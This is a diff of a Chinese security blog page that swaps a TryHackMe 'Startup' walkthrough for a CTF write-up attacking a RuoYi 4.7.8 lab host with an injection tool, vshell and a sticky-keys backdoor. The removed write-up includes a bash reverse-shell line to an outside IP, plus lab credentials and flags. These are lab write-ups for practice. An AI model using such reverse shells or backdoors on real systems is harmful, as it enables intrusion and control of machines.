@@ -16,50 +16,36 @@
   <meta name="author" content="suuuu">
   <meta name="keywords" content="blog">
   
-    <meta name="description" content="重生之我在try hack me打靶，励志成为赛博高手-DAY10-Startup尝试黑客 |启动 — TryHackMe | Startup   先进行简单的目录扫描  看到有匿名登录，先试试  get这两个把他们弄下来    emmm，好像没什么用 先看看他的80端口什么情况  打开网站 目录扫描也没有得到什么  就一个files，里面的文件就是ftp的文件 这就说明我们可以通过ftp上传文件">
+    <meta name="description" content="校验完整性-压缩包md5：certutil -hashfile AD02.zip MD5MD5 的 AD02.zip 哈希:d78ae7cfa61f6e288983cb61a84f2c7a 压缩包解压密码：BAq64bWyBYVXb7tTX1D70NEz28DicvxI 先对靶机进行信息收集  发现开了个若依，我们直接访问  发现已经有默认账号密码，我们输入验证码登录  成功登录看到版本是4.7.">
 <meta property="og:type" content="article">
-<meta property="og:title" content="重生之我在try hack me打靶，励志成为赛博高手-DAY9-Startup">
-<meta property="og:url" content="https://www.susec.xyz/2024/08/06/%E9%87%8D%E7%94%9F%E4%B9%8B%E6%88%91%E5%9C%A8try%20hack%20me%E6%89%93%E9%9D%B6%EF%BC%8C%E5%8A%B1%E5%BF%97%E6%88%90%E4%B8%BA%E8%B5%9B%E5%8D%9A%E9%AB%98%E6%89%8B-DAY9-startup/index.html">
+<meta property="og:title" content="CTF-AD01">
+<meta property="og:url" content="https://www.susec.xyz/2025/05/13/SASCTF-AD02/index.html">
 <meta property="og:site_name" content="suuuu&#39;s blog">
-<meta property="og:description" content="重生之我在try hack me打靶，励志成为赛博高手-DAY10-Startup尝试黑客 |启动 — TryHackMe | Startup   先进行简单的目录扫描  看到有匿名登录，先试试  get这两个把他们弄下来    emmm，好像没什么用 先看看他的80端口什么情况  打开网站 目录扫描也没有得到什么  就一个files，里面的文件就是ftp的文件 这就说明我们可以通过ftp上传文件">
+<meta property="og:description" content="校验完整性-压缩包md5：certutil -hashfile AD02.zip MD5MD5 的 AD02.zip 哈希:d78ae7cfa61f6e288983cb61a84f2c7a 压缩包解压密码：BAq64bWyBYVXb7tTX1D70NEz28DicvxI 先对靶机进行信息收集  发现开了个若依，我们直接访问  发现已经有默认账号密码，我们输入验证码登录  成功登录看到版本是4.7.">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408052258808.png">
-<meta property="og:image" content="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408052258820.png">
-<meta property="og:image" content="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408052258838.png">
-<meta property="og:image" content="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408052258822.png">
-<meta property="og:image" content="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408052258823.png">
-<meta property="og:image" content="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408052258826.png">
-<meta property="og:image" content="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408052258239.png">
-<meta property="og:image" content="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408052258348.png">
-<meta property="og:image" content="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408052258416.png">
-<meta property="og:image" content="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408052258582.png">
-<meta property="og:image" content="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408052258682.png">
-<meta property="og:image" content="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408052258847.png">
-<meta property="og:image" content="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408052258871.png">
-<meta property="og:image" content="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408052258924.png">
-<meta property="og:image" content="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408052258965.png">
-<meta property="og:image" content="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408052258996.png">
-<meta property="og:image" content="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408052258078.png">
-<meta property="og:image" content="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408052258148.png">
-<meta property="og:image" content="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408052258251.png">
-<meta property="og:image" content="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408052258307.png">
-<meta property="og:image" content="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408052258342.png">
-<meta property="og:image" content="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408052258749.png">
-<meta property="og:image" content="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408052258838.png">
-<meta property="og:image" content="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408052258915.png">
-<meta property="og:image" content="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408052258969.png">
-<meta property="og:image" content="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408052258022.png">
-<meta property="article:published_time" content="2024-08-05T16:00:00.000Z">
-<meta property="article:modified_time" content="2024-11-20T10:30:56.938Z">
+<meta property="og:image" content="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250512125208617.png">
+<meta property="og:image" content="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250512125216502.png">
+<meta property="og:image" content="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250512125223317.png">
+<meta property="og:image" content="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250512125231663.png">
+<meta property="og:image" content="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250512125237949.png">
+<meta property="og:image" content="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250512125246325.png">
+<meta property="og:image" content="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250512125254692.png">
+<meta property="og:image" content="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250512125302474.png">
+<meta property="og:image" content="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250512125311451.png">
+<meta property="og:image" content="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250512125317643.png">
+<meta property="og:image" content="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250512125329191.png">
+<meta property="og:image" content="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250512125334518.png">
+<meta property="og:image" content="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250512125337904.png">
+<meta property="article:published_time" content="2025-05-12T16:00:00.000Z">
+<meta property="article:modified_time" content="2025-05-12T04:53:39.055Z">
 <meta property="article:author" content="suuuu">
 <meta property="article:tag" content="打靶">
-<meta property="article:tag" content="thm">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408052258808.png">
+<meta name="twitter:image" content="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250512125208617.png">
   
   
   
-  <title>重生之我在try hack me打靶，励志成为赛博高手-DAY9-Startup - suuuu&#39;s blog</title>
+  <title>CTF-AD01 - suuuu&#39;s blog</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -254,7 +240,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="重生之我在try hack me打靶，励志成为赛博高手-DAY9-Startup"></span>
+            <span id="subtitle" data-typed-text="CTF-AD01"></span>
           
         </div>
 
@@ -265,8 +251,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2024-08-06 00:00" pubdate>
-          2024年8月6日 凌晨
+        <time datetime="2025-05-13 00:00" pubdate>
+          2025年5月13日 凌晨
         </time>
       </span>
     
@@ -277,7 +263,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          317 字
+          255 字
         
       </span>
     
@@ -333,65 +319,43 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">重生之我在try hack me打靶，励志成为赛博高手-DAY9-Startup</h1>
+            <h1 id="seo-header">CTF-AD01</h1>
             
             
               <div class="markdown-body">
                 
-                <h1 id="重生之我在try-hack-me打靶，励志成为赛博高手-DAY10-Startup"><a href="#重生之我在try-hack-me打靶，励志成为赛博高手-DAY10-Startup" class="headerlink" title="重生之我在try hack me打靶，励志成为赛博高手-DAY10-Startup"></a>重生之我在try hack me打靶，励志成为赛博高手-DAY10-Startup</h1><p><a target="_blank" rel="noopener" href="https://tryhackme.com/r/room/startup">尝试黑客 |启动 — TryHackMe | Startup</a></p>
-<p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408052258808.png" srcset="/img/loading.gif" lazyload alt="image-20240402122613116"></p>
-<p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408052258820.png" srcset="/img/loading.gif" lazyload alt="image-20240402123448476"></p>
-<p>先进行简单的目录扫描</p>
-<p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408052258838.png" srcset="/img/loading.gif" lazyload alt="image-20240402123630157"></p>
-<p>看到有匿名登录，先试试</p>
-<p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408052258822.png" srcset="/img/loading.gif" lazyload alt="image-20240402123937145"></p>
-<p>get这两个把他们弄下来</p>
-<p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408052258823.png" srcset="/img/loading.gif" lazyload alt="image-20240402124207541"></p>
-<p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408052258826.png" srcset="/img/loading.gif" lazyload alt="image-20240402124228699"></p>
-<p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408052258239.png" srcset="/img/loading.gif" lazyload alt="image-20240402124253385"></p>
-<p>emmm，好像没什么用</p>
-<p>先看看他的80端口什么情况</p>
-<p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408052258348.png" srcset="/img/loading.gif" lazyload alt="image-20240403083208971"></p>
-<p>打开网站</p>
-<p>目录扫描也没有得到什么</p>
-<p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408052258416.png" srcset="/img/loading.gif" lazyload alt="image-20240403083747285"></p>
-<p>就一个files，里面的文件就是ftp的文件</p>
-<p>这就说明我们可以通过ftp上传文件并且在http服务上激活，这跟昨天的lazyadmin有异曲同工之妙</p>
-<p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408052258582.png" srcset="/img/loading.gif" lazyload alt="image-20240403084404301"></p>
-<p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408052258682.png" srcset="/img/loading.gif" lazyload alt="image-20240403084415770"></p>
-<p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408052258847.png" srcset="/img/loading.gif" lazyload alt="image-20240403084427583"></p>
-<p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408052258871.png" srcset="/img/loading.gif" lazyload alt="image-20240403084558901"></p>
-<p>看到一个recipe.txt，不出意外这就是秘方</p>
-<p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408052258924.png" srcset="/img/loading.gif" lazyload alt="image-20240403084702351"></p>
-<p>it was love</p>
-<p>根据刚才的目录，我们只对另一个文件夹&#x2F;incidents有权限，进去看看</p>
-<p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408052258965.png" srcset="/img/loading.gif" lazyload alt="image-20240403085257635"></p>
-<p>有一个pcapng文件，也就是网络数据包</p>
-<p>把它放到ftp上再获取</p>
-<p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408052258996.png" srcset="/img/loading.gif" lazyload alt="image-20240403090034827"></p>
-<p>通过wireshark进行分析</p>
-<p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408052258078.png" srcset="/img/loading.gif" lazyload alt="image-20240403090227775"></p>
-<p>有很多的4444</p>
-<p>右键-&gt;follow-&gt;tcp stream</p>
-<p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408052258148.png" srcset="/img/loading.gif" lazyload alt="image-20240403090533052"></p>
-<p>显而易见</p>
-<p>username:lennie</p>
-<p>password:c4ntg3t3n0ughsp1c3</p>
-<p>通过ssh连接</p>
-<p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408052258251.png" srcset="/img/loading.gif" lazyload alt="image-20240403090807149"></p>
-<p>成功</p>
-<p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408052258307.png" srcset="/img/loading.gif" lazyload alt="image-20240403090848768"></p>
-<p>再看看scripts，只有这个是要root的，有明显不同</p>
-<p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408052258342.png" srcset="/img/loading.gif" lazyload alt="image-20240403092316630"></p>
-<p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408052258749.png" srcset="/img/loading.gif" lazyload alt="image-20240403092349180"></p>
-<p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408052258838.png" srcset="/img/loading.gif" lazyload alt="image-20240403092508823"></p>
-<p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408052258915.png" srcset="/img/loading.gif" lazyload alt="image-20240403092641243"></p>
-<p>找到print.sh，可以有lennie运行，所以我们只需要修改它的内容变为反弹shell即可</p>
-<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/bin/</span>bash -i &gt;&amp; <span class="hljs-regexp">/dev/</span>tcp<span class="hljs-regexp">/10.13.54.129/</span><span class="hljs-number">7777</span> <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
-
-<p>再触发（改了之后他好像就会自动触发，只要你监听就会变成root）</p>
-<p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408052258969.png" srcset="/img/loading.gif" lazyload alt="image-20240403092938032"></p>
-<p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408052258022.png" srcset="/img/loading.gif" lazyload alt="image-20240403093236419"></p>
+                <p>校验完整性-压缩包md5：<br>certutil -hashfile AD02.zip MD5<br>MD5 的 AD02.zip 哈希:<br>d78ae7cfa61f6e288983cb61a84f2c7a</p>
+<p>压缩包解压密码：BAq64bWyBYVXb7tTX1D70NEz28DicvxI</p>
+<p>先对靶机进行信息收集</p>
+<p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250512125208617.png" srcset="/img/loading.gif" lazyload alt="image-20250419221952611"></p>
+<p>发现开了个若依，我们直接访问</p>
+<p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250512125216502.png" srcset="/img/loading.gif" lazyload alt="image-20250419222045450"></p>
+<p>发现已经有默认账号密码，我们输入验证码登录</p>
+<p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250512125223317.png" srcset="/img/loading.gif" lazyload alt="image-20250419222130824"></p>
+<p>成功登录看到版本是4.7.8，我们去找找有没有历史漏洞</p>
+<p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250512125231663.png" srcset="/img/loading.gif" lazyload alt="image-20250419222213992"></p>
+<p>网上打法很多，我们找个一键工具打打试试看</p>
+<p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250512125237949.png" srcset="/img/loading.gif" lazyload alt="image-20250419222306634"></p>
+<p>先配好cookie</p>
+<p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250512125246325.png" srcset="/img/loading.gif" lazyload alt="image-20250419222348304"></p>
+<p>漏洞检测发现存在</p>
+<p>我们使用yakit进行测试</p>
+<p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250512125254692.png" srcset="/img/loading.gif" lazyload alt="image-20250419222701056"></p>
+<p>yakit开启dnslog跟LDAP反连</p>
+<p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250512125302474.png" srcset="/img/loading.gif" lazyload alt="image-20250419222821331"></p>
+<p>使用工具一键注入，成功，我们起一个vshell</p>
+<p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250512125311451.png" srcset="/img/loading.gif" lazyload alt="image-20250419223014862"></p>
+<p>启动监听之后复制windows上线命令到yakit再到一键注入运行</p>
+<p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250512125317643.png" srcset="/img/loading.gif" lazyload alt="image-20250419223114734"></p>
+<p>成功上线，读取flag</p>
+<p>flag{de5742cf-6ca0-47af-8a06-207ba1526412}</p>
+<p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250512125329191.png" srcset="/img/loading.gif" lazyload alt="image-20250419233904340"></p>
+<p>提示说有后门，并且是映像劫持</p>
+<p>一般来说就是shift后门，此时回到我们的虚拟机锁屏界面，按几下shift键</p>
+<p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250512125334518.png" srcset="/img/loading.gif" lazyload alt="image-20250419234017479"></p>
+<p>弹出cmd，执行命令发现已经是whoami权限，读取flag，至此靶机完成</p>
+<p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250512125337904.png" srcset="/img/loading.gif" lazyload alt="image-20250419234331310"></p>
+<p>flag{cc7fef38-36e9-47fa-955d-a1a8b5fdd810}</p>
 
                 
               </div>
@@ -427,8 +391,6 @@
       
         <a href="/tags/%E6%89%93%E9%9D%B6/" class="print-no-link">#打靶</a>
       
-        <a href="/tags/thm/" class="print-no-link">#thm</a>
-      
     </div>
   
 </div>
@@ -439,8 +401,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>重生之我在try hack me打靶，励志成为赛博高手-DAY9-Startup</div>
-      <div>https://www.susec.xyz/2024/08/06/重生之我在try hack me打靶，励志成为赛博高手-DAY9-startup/</div>
+      <div>CTF-AD01</div>
+      <div>https://www.susec.xyz/2025/05/13/SASCTF-AD02/</div>
     </div>
     <div class="license-meta">
       
@@ -452,7 +414,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2024年8月6日</div>
+          <div>2025年5月13日</div>
         </div>
       
       
@@ -484,9 +446,9 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2024/08/07/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/" title="渗透测试基础">
+                      <a href="/2025/05/13/SASCTF-AD01/" title="CTF-AD01">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">渗透测试基础</span>
+                        <span class="hidden-mobile">CTF-AD01</span>
                         <span class="visible-mobile">上一篇</span>
                       </a>
                     
@@ -494,8 +456,8 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2024/08/05/vulhub%E9%9D%B6%E5%9C%BA-EVILBOX_ONE/" title="EVILBOX_ONE">
-                        <span class="hidden-mobile">EVILBOX_ONE</span>
+                      <a href="/2025/05/13/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Delegation/" title="春秋云境-Delegation">
+                        <span class="hidden-mobile">春秋云境-Delegation</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
